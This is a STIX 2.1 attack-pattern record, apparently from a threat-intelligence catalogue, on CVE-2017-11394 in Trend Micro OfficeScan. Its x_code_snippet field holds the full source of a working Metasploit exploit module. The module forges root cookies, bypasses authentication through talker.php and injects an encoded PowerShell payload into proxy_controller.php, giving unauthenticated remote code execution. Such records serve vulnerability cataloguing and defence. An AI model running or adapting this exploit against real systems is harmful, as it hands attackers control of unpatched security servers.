{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25115bfd-37d4-40b5-823b-888b6b4c1406",
    "created": "2024-08-14T16:55:24.440222Z",
    "modified": "2024-08-14T16:55:24.440226Z",
    "name": "\"Trend Micro OfficeScan Remote Code Execution\"",
    "description": " This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user.  The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities unauthenticated users can execute a terminal command under the context of the web server user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/trendmicro_officescan_widget_exec.rb",
            "external_id": "trendmicro_officescan_widget_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-11394"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/"
        },
        {
            "source_name": "reference",
            "url": "http://www.zerodayinitiative.com/advisories/ZDI-17-521/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Trend Micro OfficeScan Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a\n        terminal command under the context of the web server user.\n\n        The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product\n        has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which\n        leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process\n        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,\n        unauthenticated users can execute a terminal command under the context of the web server user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <mr_me@offensive-security.com>', # author of command injection\n          'Mehmet Ince <mehmet@mehmetince.net>' # author of authentication bypass & msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-11394'],\n          ['URL', 'https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/'],\n          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-17-521/'],\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n      'Platform'       => ['win'],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }],\n          ['OfficeScan 11', {}],\n          ['OfficeScan XG', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-10-07',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the Trend Micro OfficeScan management interface', '/'])\n      ]\n    )\n  end\n\n  def build_csrftoken(my_target, phpsessid=nil)\n    vprint_status(\"Building csrftoken\")\n    if my_target.name == 'OfficeScan XG'\n      csrf_token = Rex::Text.md5(Time.now.to_s)\n    else\n      csrf_token = phpsessid.scan(/PHPSESSID=([a-zA-Z0-9]+)/).flatten[0]\n    end\n    csrf_token\n  end\n\n  def auto_target\n    #XG version of the widget library has package.json within the same directory.\n    mytarget = target\n    if target['auto'] && target.name =~ /Automatic/\n      print_status('Automatic targeting enabled. Trying to detect version.')\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'package.json'),\n      })\n\n      if res && res.code == 200\n        mytarget = targets[2]\n      elsif res && res.code == 404\n        mytarget = targets[1]\n      else\n        fail_with(Failure::Unknown, 'Unable to automatically select a target')\n      end\n      print_status(\"Selected target system : #{mytarget.name}\")\n    end\n    mytarget\n  end\n\n  def auth(my_target)\n    # Version XG performs MD5 validation on wf_CSRF_token parameter. We can't simply use PHPSESSID directly because it contains a-zA-Z0-9.\n    # Beside that, version 11 use PHPSESSID value as a csrf token. Thus, we are manually crafting the cookie.\n    if my_target.name == 'OfficeScan XG'\n      csrf_token = build_csrftoken(my_target)\n      cookie = \"LANG=en_US; LogonUser=root; userID=1; wf_CSRF_token=#{csrf_token}\"\n    # Version 11 want to see valid PHPSESSID from beginning to the end. For this reason we need to force backend to initiate one for us.\n    else\n      vprint_status(\"Sending session initiation request for : #{my_target.name}.\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'index.php'),\n      })\n      cookie = \"LANG=en_US; LogonUser=root; userID=1; #{res.get_cookies}\"\n      csrf_token = build_csrftoken(my_target, res.get_cookies)\n    end\n\n    # Okay, we dynamically generated a cookie and csrf_token values depends on OfficeScan version.\n    # Now we need to exploit authentication bypass vulnerability.\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'ui', 'modLogin', 'talker.php'),\n      'headers' => {\n        'X-CSRFToken' => csrf_token,\n        'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'\n      },\n      'cookie' => cookie,\n      'vars_post' => {\n        'cid' => '1',\n        'act' => 'check',\n        'hash' => Rex::Text.rand_text_alpha(10),\n        'pid' => '1'\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?('login successfully')\n      # Another business logic in here.\n      # Version 11 want to use same PHPSESSID generated at the beginning by hitting index.php\n      # Version XG want to use newly created PHPSESSID that comes from auth bypass response.\n      if my_target.name == 'OfficeScan XG'\n        res.get_cookies\n      else\n        cookie\n      end\n    else\n       nil\n    end\n  end\n\n  def check\n    my_target = auto_target\n    token = auth(my_target)\n    # If we dont have a cookie that means authentication bypass issue has been patched on target system.\n    if token.nil?\n      Exploit::CheckCode::Safe\n    else\n      # Authentication bypass does not mean that we have a command injection.\n      # Accessing to the widget framework without having command injection means literally nothing.\n      # So we gonna trigger command injection vulnerability without a payload.\n      csrf_token = build_csrftoken(my_target, token)\n      vprint_status('Trying to detect command injection vulnerability')\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'proxy_controller.php'),\n        'headers' => {\n          'X-CSRFToken' => csrf_token,\n          'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'\n        },\n        'cookie' => \"LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{token}\",\n        'vars_post' => {\n          'module' => 'modTMCSS',\n          'serverid' => '1',\n          'TOP' => ''\n        }\n      })\n      if res && res.code == 200 && res.body.include?('Proxy execution failed: exec report.php failed')\n        Exploit::CheckCode::Vulnerable\n      else\n        Exploit::CheckCode::Safe\n      end\n    end\n  end\n\n  def exploit\n    mytarget = auto_target\n    print_status('Exploiting authentication bypass')\n    cookie = auth(mytarget)\n    if cookie.nil?\n      fail_with(Failure::NotVulnerable, \"Target is not vulnerable.\")\n    else\n      print_good(\"Authenticated successfully bypassed.\")\n    end\n\n    print_status('Generating payload')\n\n    powershell_options = {\n      encode_final_payload: true,\n      remove_comspec: true\n    }\n    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)\n\n\n    # We need to craft csrf value for version 11 again like we did before at auth function.\n    csrf_token = build_csrftoken(mytarget, cookie)\n\n    print_status('Trigerring command injection vulnerability')\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'officescan', 'console', 'html', 'widget', 'proxy_controller.php'),\n      'headers' => {\n        'X-CSRFToken' => csrf_token,\n        'ctype' => 'application/x-www-form-urlencoded; charset=utf-8'\n      },\n      'cookie' => \"LANG=en_US; LogonUser=root; wf_CSRF_token=#{csrf_token}; #{cookie}\",\n      'vars_post' => {\n        'module' => 'modTMCSS',\n        'serverid' => '1',\n        'TOP' => \"2>&1||#{p}\"\n      }\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-07",
    "x_mitre_platforms": [
        "['win']"
    ]
}